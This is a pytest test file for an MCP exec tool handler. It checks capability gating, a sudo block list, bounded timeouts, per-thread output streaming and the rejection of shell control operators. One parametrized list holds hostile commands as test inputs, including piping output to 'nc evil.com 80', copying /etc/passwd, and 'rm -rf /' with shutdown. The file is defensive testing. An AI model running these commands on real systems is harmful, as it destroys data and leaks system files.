"""Tests for ralph/mcp/tool_exec.py — MCP exec tool handler."""

from __future__ import annotations

import subprocess
import threading
from typing import TYPE_CHECKING

import pytest

import ralph.mcp.tools._exec_completed_process as exec_completed_process
import ralph.mcp.tools.exec as exec_tool
from ralph.mcp.protocol.session import AgentSession
from ralph.mcp.tools.coordination import (
    CapabilityDeniedError,
    InvalidParamsError,
    ToolContent,
)
from ralph.mcp.tools.exec import (
    DEFAULT_TIMEOUT_MS,
    ExecRunDeps,
    handle_exec_command,
    parse_exec_params,
    run_command,
)
from tests.mock_session import MockSession
from tests.mock_workspace_root import MockWorkspaceRoot

if TYPE_CHECKING:
    from pathlib import Path


CUSTOM_TIMEOUT_MS = 5000
EXPECTED_TIMEOUT_SECONDS = 2.5


class TestHandleExecCommand:
    def test_exec_with_valid_command_succeeds(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        session = MockSession({"ProcessExecBounded"})
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "echo", "args": ["hello"], "timeout_ms": 5000}

        result = handle_exec_command(session, workspace, params)
        assert result.is_error is False
        content = result.content[0]
        assert isinstance(content, ToolContent)
        assert "hello" in content.text

    def test_exec_without_capability_raises(self, tmp_path: Path) -> None:
        session = MockSession(set())  # No capabilities
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "ls", "args": []}

        with pytest.raises(CapabilityDeniedError):
            handle_exec_command(session, workspace, params)

    def test_exec_allows_git_command(self, tmp_path: Path) -> None:
        session = MockSession({"ProcessExecBounded"})
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "git", "args": ["--version"]}

        result = handle_exec_command(session, workspace, params)
        assert result.is_error is False
        content = result.content[0]
        assert isinstance(content, ToolContent)
        assert "git version" in content.text.lower()

    def test_exec_with_blacklisted_command_raises(self, tmp_path: Path) -> None:
        session = MockSession({"ProcessExecBounded"})
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "sudo", "args": ["ls"]}

        with pytest.raises(CapabilityDeniedError):
            handle_exec_command(session, workspace, params)

    def test_exec_timeout_returns_actionable_is_error_result_not_exception(
        self, tmp_path: Path
    ) -> None:
        """A timed-out exec must come back as an is_error ToolResult (not a raised
        ExecutionError that the MCP server turns into a -32603 protocol error the
        agent retries forever). The message must be actionable and non-retryable."""

        def _timeout_runner(
            command: list[str], cwd: object, timeout_seconds: float | None
        ) -> exec_completed_process._CompletedProcessAdapter:
            del cwd
            raise subprocess.TimeoutExpired(cmd=command, timeout=timeout_seconds or 30.0)

        session = MockSession({"ProcessExecBounded"})
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "echo", "args": [], "timeout_ms": 5000}

        result = handle_exec_command(
            session, workspace, params, deps=ExecRunDeps(runner=_timeout_runner)
        )

        assert result.is_error is True
        content = result.content[0]
        assert isinstance(content, ToolContent)
        text = content.text.lower()
        assert "timed out" in text
        assert "timeout_ms" in text
        assert "do not retry" in text

    def test_exec_default_timeout_exceeds_verify_budget(self) -> None:
        """The exec default must exceed the 60s combined verify budget so an agent
        running verification through exec does not time out on every call."""
        assert DEFAULT_TIMEOUT_MS > 60_000
        assert parse_exec_params({"command": "make"}).timeout_ms > 60_000

    def test_exec_returns_error_on_nonzero_exit(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        session = MockSession({"ProcessExecBounded"})
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "false", "args": [], "timeout_ms": 5000}

        monkeypatch.setattr(
            exec_tool,
            "run_command",
            lambda *args, **kwargs: exec_completed_process._CompletedProcessAdapter(
                stdout=b"", stderr=b"", returncode=1
            ),
        )

        result = handle_exec_command(session, workspace, params)
        assert result.is_error is True

    def test_thread_owned_session_sink_receives_chunks_before_final_result(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Output chunks flow to the sink owned by the dispatching thread.

        The session is shared across concurrent request threads, so chunks
        are attributed via thread ownership: the dispatching thread's sink
        receives them; a sink owned by another thread receives nothing.
        """

        def fake_run_command(
            command: str,
            args: list[str],
            workspace: object,
            timeout_ms: int,
            deps: ExecRunDeps | None = None,
        ) -> exec_completed_process._CompletedProcessAdapter:
            del command, args, workspace, timeout_ms
            if deps is not None and deps.on_output_chunk is not None:
                deps.on_output_chunk("streamed-chunk")
            return exec_completed_process._CompletedProcessAdapter(
                stdout=b"streamed-chunk", stderr=b"", returncode=0
            )

        monkeypatch.setattr(exec_tool, "run_command", fake_run_command)

        session = AgentSession(
            session_id="s", run_id="r", drain="d", capabilities={"ProcessExecBounded"}
        )
        streamed: list[dict[str, object]] = []
        session.tool_output_sink_entry = (threading.get_ident(), streamed.append)
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "echo", "args": [], "timeout_ms": 5000}

        result = handle_exec_command(session, workspace, params)

        assert result.is_error is False
        assert streamed, "the owning thread's sink must receive output chunks"
        for event in streamed:
            assert event.get("tool") == "exec"
            assert event.get("stream") == "combined"
            assert isinstance(event.get("text"), str)

        # A sink owned by a DIFFERENT thread must receive nothing — routing
        # this dispatch's output there is the cross-connection leak.
        foreign: list[dict[str, object]] = []
        session.tool_output_sink_entry = (threading.get_ident() + 1, foreign.append)
        result = handle_exec_command(session, workspace, params)
        assert result.is_error is False
        assert foreign == []
        text_parts: list[str] = []
        for event in streamed:
            text_val = event.get("text")
            if isinstance(text_val, str):
                text_parts.append(text_val)
        assert "streamed-chunk" in "".join(text_parts)


class TestRunCommandAlwaysBounded:
    """Defense in depth: run_command must never hand the runner an unbounded
    (None) timeout, even if called directly with timeout_ms<=0. An unbounded
    blocking call hangs the MCP server thread (an agent-controllable hang)."""

    def test_zero_timeout_passes_bounded_timeout_to_runner(self, tmp_path: Path) -> None:
        captured: list[float | None] = []

        def _runner(
            argv: list[str], cwd: Path, timeout_seconds: float | None
        ) -> exec_completed_process._CompletedProcessAdapter:
            del argv, cwd
            captured.append(timeout_seconds)
            return exec_completed_process._CompletedProcessAdapter(
                stdout=b"", stderr=b"", returncode=0
            )

        run_command("echo", [], MockWorkspaceRoot(tmp_path), 0, deps=ExecRunDeps(runner=_runner))

        assert captured == [DEFAULT_TIMEOUT_MS / 1000]


class TestExecRejectsShellOperators:
    """Security: exec must reject shell control operators at the trust boundary.

    The per-token blacklist in ``check_command`` only inspects the command
    name and the argv list it parsed out. If a compound / piped /
    redirected command is forwarded to ``sh -c`` the embedded
    sub-commands (curl to a remote URL, sudo, ``rm -rf /``) bypass the
    blacklist entirely because the policy never sees them. The exec
    boundary must reject any shell control character in the raw
    command string and direct the caller to ``unsafe_exec`` /
    ``raw_exec`` (the documented surface for compound shell work).
    """

    @pytest.mark.parametrize(
        "compound_command",
        [
            "echo safe; curl https://example.com",
            "echo x && sudo apt install vim",
            "cat /etc/passwd > /tmp/steal.txt",
            "echo hi | nc evil.com 80",
            "ls;rm -rf /;shutdown -h now",
            "echo hi || curl https://example.com",
            "echo 'safe; curl https://example.com'",  # quoted operator still rejected
            "echo hi & rm -rf /tmp",
        ],
    )
    def test_parse_exec_params_rejects_shell_operators(
        self, compound_command: str
    ) -> None:
        with pytest.raises(InvalidParamsError) as exc_info:
            parse_exec_params({"command": compound_command})
        message = str(exc_info.value)
        assert "unsafe_exec" in message or "raw_exec" in message, (
            "Rejection must point the caller at the documented "
            "compound-shell surface, not a generic error"
        )

    def test_handle_exec_command_rejects_compound_shell(
        self, tmp_path: Path
    ) -> None:
        """Top-level handler propagates the parse-time rejection."""
        session = MockSession({"ProcessExecBounded"})
        workspace = MockWorkspaceRoot(tmp_path)
        with pytest.raises(InvalidParamsError):
            handle_exec_command(
                session,
                workspace,
                {"command": "echo safe; curl https://example.com"},
            )

    def test_safe_command_without_operators_still_allowed(self) -> None:
        """A regression check: a single non-compound command still parses."""
        params = parse_exec_params({"command": "echo", "args": ["hello"]})
        assert params.command == "echo"
        assert params.args == ["hello"]
